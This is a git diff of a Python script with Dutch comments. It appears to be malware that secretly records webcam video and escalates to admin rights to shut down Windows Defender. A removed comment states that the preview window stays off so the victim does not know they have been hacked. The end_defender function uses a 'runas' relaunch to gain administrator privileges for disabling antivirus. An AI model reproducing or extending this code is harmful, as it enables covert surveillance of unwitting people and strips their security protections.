@@ -72,15 +72,8 @@ def get_camRecording():
 
         out.write(frame)
 
-        # zien wat record wordt op scherm, uit omdat je niet wilt dat de persoon weet dat hij gehackt is
-        # cv2.imshow('Camera', frame)
-
         # als de video langer dan 5 seconden wordt, stop de video
         if time.time() - start_time > 5:
-            break
-
-        # als q geklikt wordt beindig video
-        if cv2.waitKey(1) == ord('q'):
             break
 
     # als de loop stopt de camera opname afsluiten
@@ -99,7 +92,7 @@ def end_defender():
     if sys.argv[-1] != ASADMIN:
         # haalt de path of van deze script
         script = os.path.abspath(sys.argv[0])
-        # start deze functie opnieuw maar dit keer met admin rechten
+        # start deze functie opnieuw maar dit keer met admin rechten voor de file waarin deze script in staat
         params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
         # sluit de powershell die geen admin rechten heeft
